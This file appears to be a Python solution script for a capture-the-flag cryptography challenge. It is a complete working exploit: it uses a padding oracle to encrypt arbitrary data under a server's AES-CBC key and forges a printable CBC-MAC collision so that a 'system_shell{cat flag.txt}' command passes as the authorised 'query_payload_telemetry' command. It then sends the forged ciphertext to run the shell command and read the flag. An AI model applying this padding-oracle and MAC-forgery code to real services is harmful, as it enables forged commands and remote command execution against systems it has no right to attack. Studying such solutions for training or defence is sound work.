import argparse
import binascii
import itertools
import os
import socket
import pwn
from base64 import b64encode
from string import printable
from Cryptodome.Util.strxor import strxor
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

QUERY_PAYLOAD_TELEM_CBC_MAC = '38746F66D25874A67FBFB9FB0F248F1B'  # Needs to match the CBC-MAC in the challenge PDF


def xor_bytes(bytes1: bytes, bytes2: bytes):
    xor = b''
    for b1, b2 in zip(bytes1, bytes2):
        xor += bytes([b1 ^ b2])
    return xor


def encrypt_cipher_block(plaintext, next_block, chal_conn, print_output=False):
    """
    Encrypts a cipher block using padding oracle attack
    Works backwards: encrypts the next-to-last block (C(n-1)), then the next-next-to-last (C(n-1)),
    until it gets to the first block.
    If you can control the IV, then the first block can be the IV.
    If you don't control the IV, then you'll end up with one junk block and then your encrypted plaintext

    Parameters:
        @plaintext: the plaintext you would like to encrypt
        @next_block: the next ciphertext block (can be anything if this is the first block)
        @is_padding_valid: function that returns True if a given ciphertext with padding is valid

    Great writeup on this attack:
    https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data
    """
    block1 = b''
    for crack_char_idx in range(AES.block_size):  # crack one byte at a time in the block
        # Create a giant packet with 256 commands:
        # one attempt to crack each possible character for the next byte in the block
        def craft_crack_attempt(char_idx, curr_block, next_block):
            return b64encode(
                b'\00' * (AES.block_size - len(curr_block) - 1) + bytes([char_idx]) + curr_block + next_block)

        crack_attempts = [craft_crack_attempt(char_idx, block1, next_block) for char_idx in range(256)]
        chal_conn.send(b'\x00'.join(crack_attempts) + b'\x00')  # Join all the commands with a null byte

        # Check the server's response to all 256 attempts - all but one will say bad padding
        valid_char_idx = None
        for idx in range(256):
            line = chal_conn.recvline(timeout=2)
            if line[0:2] != b'+-':
                raise ValueError
            line = chal_conn.recvline(timeout=2)  # This line indicates bad padding
            if line[0:2] != b'| ':
                raise ValueError
            if b'Bad padding' not in line:
                block1 = bytes([idx]) + block1
                if print_output:
                    print(f'\033[K\rCracked {block1}', end='')
                valid_char_idx = idx
            line = chal_conn.recvline(timeout=2)
            if line[0:2] != b'+-':
                raise ValueError
        if valid_char_idx is None:
            raise RuntimeError('No valid byte found')

        current_padding_byte = bytes([crack_char_idx + 1])
        next_padding_byte = bytes([crack_char_idx + 2])
        block1 = xor_bytes(block1, current_padding_byte * len(block1))  # set all of our cracked padding bytes to 0
        block1 = xor_bytes(block1,
                           next_padding_byte * len(block1))  # set all of our cracked padding bytes to the next padding
    xor_with_pt = xor_bytes(b'\x11' * 16, block1)
    xor_with_pt = xor_bytes(plaintext, xor_with_pt)
    return xor_with_pt


def encrypt_data(plaintext, chal_conn):
    """
    Encrypts an entire block of plaintext using padding oracle attack
    """
    # First pad the plaintext
    pt_padded = pad(plaintext, AES.block_size)
    # Divide up into blocks
    pt_blocks = []
    for idx in range(0, len(pt_padded), AES.block_size):
        print(idx, flush=True)
        pt_blocks.append(pt_padded[idx:(idx + AES.block_size)])
    # Use the padding oracle to generate valid ciphertext for each block
    # Work backwards: start from the next-to-last block and move to the first block
    # Add the last ciphertext block which can be any random data. We'll fill it with 'A'
    ct_blocks = [b'A' * AES.block_size]
    next_block = ct_blocks[-1]
    for pt_block_idx, pt_block in enumerate(pt_blocks[::-1]):
        print(f'Block {pt_block_idx}:')
        ct_block = encrypt_cipher_block(pt_block, next_block, chal_conn, print_output=True)
        print()
        ct_blocks.append(ct_block)
        next_block = ct_block
    return b''.join(reversed(ct_blocks))


def cbc_mac(data_to_digest):
    iv = b'\0' * 16
    cipher = AES.new(bytes.fromhex(QUERY_PAYLOAD_TELEM_CBC_MAC), AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data_to_digest, AES.block_size))[-16:]


def collider(original_data: bytes, prefix: bytes) -> bytes:
    """Given a prefix, returns a new bytes object with the same CBC-MAC hash as original_data"""
    return pad(prefix, AES.block_size) \
           + strxor(original_data[:16], cbc_mac(prefix)) \
           + original_data[16:]


def printable_collider(original_data, prefix):
    """Given a prefix, returns a new bytes object of printable characters with the same CBC-MAC hash as original_data"""
    printable_bytes = set(bytes(printable, 'UTF-8'))

    # 16 - 7 leaves us with 9. A PKCS7 padding of 9 bytes is the printable character b'\x09', or b'\t' (tab character)
    # No other padding character is printable so doing the below math is required
    printable_padding_len = (7 - len(prefix)) % 16
    if printable_padding_len == 0:
        printable_padding_len = 16

    for printable_padding in itertools.product(printable_bytes, repeat=printable_padding_len):
        paddedPrefix = prefix + bytes(printable_padding)
        collision = collider(original_data, paddedPrefix)

        # if the collision can be converted to UTF-8, then return it; otherwise, try again
        try:
            collision.decode("UTF-8")
        except ValueError:
            continue
        else:
            return collision


def tcp_padding_oracle(ciphertext, chal_conn):
    chal_conn.send(b64encode(ciphertext) + b'\x00')
    invalid_padding_indicator = 'Bad padding'
    response = chal_conn.recv().decode()
    return not (invalid_padding_indicator in response)


def main(args=None):
    if args is None:
        parser = argparse.ArgumentParser()
        parser.add_argument('host', default='127.0.0.1')
        parser.add_argument('port', type=int, default=12345)
        parser.add_argument('service_host', default='127.0.0.1')
        parser.add_argument('service_port', type=int, default=12346)
        args = parser.parse_args()

    # Use pwntools to connect to the challenge
    # chal_conn = pwn.remote(args.host, args.port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((args.host, args.port))

    ticket = os.getenv("TICKET")
    if ticket != None:
        resp = sock.recv(1000)
        print(resp, flush=True)
        print("Ticket sent {}".format(ticket), flush=True)
        sock.send(ticket.encode('utf-8'))
        sock.send("\n".encode('utf-8'))

    resp = sock.recv(1000)
    resp = sock.recv(1000)
    print(resp.decode('utf-8'), flush=True)

    original_cmd = b"query_payload_telemetry"  # This is the command we're going to impersonate
    print(f'Using CBC-MAC key {QUERY_PAYLOAD_TELEM_CBC_MAC} (from intelligence cable PDF)')
    original_cmd_hash = cbc_mac(original_cmd)
    print(f'Working to find a collision with {original_cmd} which hashes to: {binascii.hexlify(original_cmd_hash).upper()}', flush=True)

    new_cmd = b"system_shell"  # Command we want to trick the server into accepting by colliding the CBC-MAC digest
    collision = printable_collider(original_cmd, new_cmd)
    print(f'Found a collision: {collision} which hashes to: {binascii.hexlify(cbc_mac(collision)).upper()}',
          flush=True)
    # Add system shell arguments
    # The server only checks the MAC on the command name, so we can add arguments after causing the collision
    collision = collision.replace(b'system_shell', b'system_shell{cat flag.txt}')

    # Open a connection to the challenge server
    chal_conn = pwn.remote(args.service_host, args.service_port)

    # Use padding oracle to encrypt the system_shell command
    is_padding_valid = lambda ct: tcp_padding_oracle(ct, chal_conn)
    # Generate ciphertext:
    ciphertext = encrypt_data(collision, chal_conn)
    # Some other examples of encrypting cleartext commands
    # ciphertext = encrypt_data(b'query_payload_telemetry{}', is_padding_valid)
    # ciphertext = encrypt_data(b'log_info{}', is_padding_valid)
    chal_conn.close()

    # This prints hex of the ciphertext. To send it to the server, run something like:
    # echo -en <hex> | xxd -r -p | nc <server> <port>
    b64_cipher = b64encode(ciphertext)
    print(f'Ciphertext (base64): {b64_cipher.decode()}')

    # Send the ciphertext with shell command and get the flag
    run_soln = pwn.remote(args.service_host, args.service_port)
    run_soln.send(b64_cipher + b"\x00")
    resp = run_soln.recv()
    print(resp.decode())
    run_soln.close()


if __name__ == '__main__':
    main()
